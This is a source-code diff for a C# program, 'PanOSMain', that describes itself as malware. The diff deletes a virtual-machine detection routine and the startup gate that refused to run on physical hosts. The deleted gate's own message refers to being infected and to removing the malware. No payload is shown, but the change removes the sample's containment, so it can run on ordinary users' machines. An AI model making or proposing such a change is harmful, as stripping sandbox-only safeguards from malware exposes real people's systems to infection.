@@ -31,27 +31,6 @@ namespace PanOSMain
         ///
         /// Handling the window messages
         ///
-        private bool isVM()
-        {
-            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
-            {
-                using (var items = searcher.Get())
-                {
-                    foreach (var item in items)
-                    {
-                        string manufacturer = item["Manufacturer"].ToString().ToLower();
-                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
-                            || manufacturer.Contains("vmware")
-                            || item["Model"].ToString() == "VirtualBox")
-                        {
-                            return true;
-                        }
-                    }
-                }
-            }
-            return false;
-        }
-
         private bool isInstalledDotNetCompatible()
         {
             using (RegistryKey ndpKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\"))
@@ -93,13 +72,7 @@ namespace PanOSMain
                 Environment.Exit(0);
             }
             else
-            if (isVM() == false)
-            {
-                MessageBox.Show("You're not using a Virtual Machine, so you may not proceed. If you have been infected on your host, please email the creator at orangemanagementcorpn@gmail.com for steps to remove this malware.", "Virtual Machine Check", MessageBoxButton.OK, MessageBoxImage.Error);
-                Environment.Exit(0);
-            }
-            else
-            {
+                {
                 try
                 {
                     InitializeComponent();
